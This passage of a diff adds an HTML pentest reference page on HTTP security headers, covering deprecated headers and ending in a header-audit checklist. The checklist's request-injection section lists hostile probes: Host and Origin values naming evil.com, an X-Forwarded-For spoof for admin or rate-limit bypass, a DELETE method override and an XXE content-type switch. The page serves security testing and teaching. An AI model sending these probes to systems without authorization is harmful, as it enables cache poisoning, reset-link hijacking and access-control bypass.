+<span class="header-name">CORP:</span> <span class="header-value">same-origin</span> <span class="comment">| same-site | cross-origin</span>
+<span class="comment"># Controls who can embed/load this resource</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Security Angles</div>
+              <ul>
+                <li><strong>COOP missing</strong> — window.opener exploitation: a popup opened by attacker can access opener's window object</li>
+                <li><strong>CORP missing</strong> — cross-origin pages can embed your resources in img/script tags, enabling timing attacks (Spectre-style cross-origin leaks)</li>
+                <li><strong>XS-Leaks</strong> — timing/oracle attacks that leak cross-origin data without CORS by measuring side channels</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- X-XSS-PROTECTION -->
+      <div class="header-card hc-low" id="xxp" data-severity="low">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">X-XSS-Protection <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-low">Deprecated</span>
+            <span class="badge badge-info">Legacy Only</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is (Was)</div>
+              <p>A legacy header for IE/Chrome's built-in XSS filter. <strong>Completely deprecated</strong> — Chrome removed it in 2019, Firefox never implemented it. Using it today can actually CREATE security vulnerabilities.</p>
+              <div class="code-block">
+<span class="header-name">X-XSS-Protection:</span> <span class="bad">1; mode=block</span>
+<span class="comment"># DO NOT USE. Deprecated. Causes more harm than good.</span>
+
+<span class="comment"># The mode=block variant was found to cause XSS
+# on pages that didn't have it before (bypass via blocking
+# legitimate content, exposing different code paths)</span>
+
+<span class="good"># Correct: Use CSP instead. It's the real fix.</span>
+<span class="header-name">Content-Security-Policy:</span> <span class="good">script-src 'self'</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Pentest Note</div>
+              <ul>
+                <li>If you see this header — note it but don't rely on it being a defense</li>
+                <li>It offers zero protection in modern browsers</li>
+                <li>Presence indicates legacy/outdated security headers — check for other outdated defenses</li>
+                <li>Its absence is NOT a vulnerability in a report (CSP absence is)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- EXPECT-CT -->
+      <div class="header-card hc-low" id="expect-ct" data-severity="low">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Expect-CT <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-low">Deprecated</span>
+            <span class="badge badge-info">Certificate Transparency</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Was</div>
+              <p>Told browsers to require Certificate Transparency (CT) logs for TLS certificates on this domain. CT logs make it impossible for CAs to issue unauthorized certs without detection. <strong>Deprecated in 2021 — CT is now mandatory for all publicly-trusted certs.</strong></p>
+              <div class="code-block">
+<span class="header-name">Expect-CT:</span> <span class="bad">max-age=86400, enforce</span>
+<span class="comment"># Still seen on old sites. No security value today.
+# Chrome enforces CT by default since 2018.
+# Safe to ignore in findings.</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Context</div>
+              <p>Certificate Transparency means every TLS certificate must be logged in public CT logs. This prevents rogue CAs from issuing fraudulent certificates for your domain silently. You can monitor CT logs for your domain using <code>crt.sh</code> — useful for reconnaissance too (subdomain discovery).</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- END RESPONSE HEADERS -->
+
+    <!-- ── SUMMARY TABLE ── -->
+    <div class="section-divider">
+      <div class="section-divider-line"></div>
+      <div class="section-divider-text">Quick Reference</div>
+      <div class="section-divider-line"></div>
+    </div>
+
+    <div class="section" style="margin-top:32px;">
+      <div class="section-header">
+        <div class="section-icon">≡</div>
+        <div class="section-meta">
+          <div class="section-label">Cheat Sheet</div>
+          <div class="section-title">Pentest Header Checklist</div>
+          <div class="section-subtitle">What to check on every engagement</div>
+        </div>
+      </div>
+
+      <div class="warn-box">
+        <strong>Every Single Target — Run This</strong>
+        Open Burp, browse the app, go to HTTP History. Pick any response. These are the things you check immediately.
+      </div>
+
+      <div class="code-block" style="font-size:12px;line-height:1.9;">
+<span class="comment">═══ RESPONSE HEADER AUDIT ═══</span>
+
+<span class="keyword">[ ]</span> <span class="header-name">Content-Security-Policy</span>     <span class="comment">Present? Strong? unsafe-inline? Wildcards?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Strict-Transport-Security</span>    <span class="comment">Present? max-age > 1yr? includeSubDomains?</span>
+<span class="keyword">[ ]</span> <span class="header-name">X-Frame-Options</span>             <span class="comment">Present? DENY or SAMEORIGIN? (or CSP frame-ancestors)</span>
+<span class="keyword">[ ]</span> <span class="header-name">X-Content-Type-Options</span>      <span class="comment">Must be: nosniff</span>
+<span class="keyword">[ ]</span> <span class="header-name">Referrer-Policy</span>             <span class="comment">Present? strict-origin-when-cross-origin?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Permissions-Policy</span>          <span class="comment">Present? Restricts camera/mic/geolocation?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Server</span> <span class="bad">/ X-Powered-By</span>      <span class="comment">Version disclosed? Note exact version → search CVEs</span>
+<span class="keyword">[ ]</span> <span class="header-name">Set-Cookie</span>                  <span class="comment">HttpOnly? Secure? SameSite? Reasonable expiry?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Access-Control-Allow-Origin</span> <span class="comment">Wildcard? Reflects Origin? Credentials=true?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Cache-Control</span>               <span class="comment">Sensitive pages: no-store present?</span>
+
+<span class="comment">═══ REQUEST HEADER INJECTION ═══</span>
+
+<span class="keyword">[ ]</span> <span class="header-name">Host:</span> <span class="attack">evil.com</span>               <span class="comment">Password reset poisoning? Cache poisoning?</span>
+<span class="keyword">[ ]</span> <span class="header-name">X-Forwarded-For:</span> <span class="attack">127.0.0.1</span>  <span class="comment">Admin panel access? Rate limit bypass?</span>
+<span class="keyword">[ ]</span> <span class="header-name">X-Forwarded-Host:</span> <span class="attack">evil.com</span>  <span class="comment">Cache poisoning via unkeyed header?</span>
+<span class="keyword">[ ]</span> <span class="header-name">X-HTTP-Method-Override:</span> <span class="attack">DELETE</span> <span class="comment">Method-based ACL bypass?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Content-Type:</span> <span class="attack">application/xml</span> <span class="comment">XXE on JSON endpoints?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Origin:</span> <span class="attack">https://evil.com</span>    <span class="comment">Reflected in ACAO? + ACAC: true?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Authorization:</span> <span class="attack">[removed]</span>    <span class="comment">Endpoint works without auth?</span>
+<span class="keyword">[ ]</span> <span class="header-name">Content-Length</span> + <span class="header-name">Transfer-Encoding</span> <span class="comment">HTTP Smuggling on proxy architectures</span>
+      </div>
+    </div>
+
+  </div><!-- end content -->
+</div><!-- end main -->
+
+<script>
+function toggleCard(card) {
+  card.classList.toggle('open');
+}
+
+function expandAll() {
+  document.querySelectorAll('.header-card').forEach(c => c.classList.add('open'));
+}
+
+function collapseAll() {
+  document.querySelectorAll('.header-card').forEach(c => c.classList.remove('open'));
+}
+
+function filterSeverity(sev) {
+  document.querySelectorAll('#filt-crit, #filt-high').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.header-card').forEach(card => {
+    if (sev === 'all') {
+      card.style.display = '';
+    } else {
+      const cardSev = card.dataset.severity;
+      card.style.display = (cardSev === sev) ? '' : 'none';
+    }
+  });
+  if (sev === 'critical') document.getElementById('filt-crit').classList.add('active');
+  if (sev === 'high') document.getElementById('filt-high').classList.add('active');
+}
+
+function scrollTo(id) {
+  const el = document.getElementById(id);
+  if (el) {
+    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    el.classList.add('open');
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    event.target.classList.add('active');
+  }
+}
+
+// Progress bar
+window.addEventListener('scroll', () => {
+  const doc = document.documentElement;
+  const scrollTop = doc.scrollTop || document.body.scrollTop;
+  const scrollHeight = doc.scrollHeight - doc.clientHeight;
+  const pct = Math.round((scrollTop / scrollHeight) * 100);
+  document.getElementById('prog-fill').style.width = pct + '%';
+  document.getElementById('prog-pct').textContent = pct + '%';
+});
+</script>
+</body>
+</html>
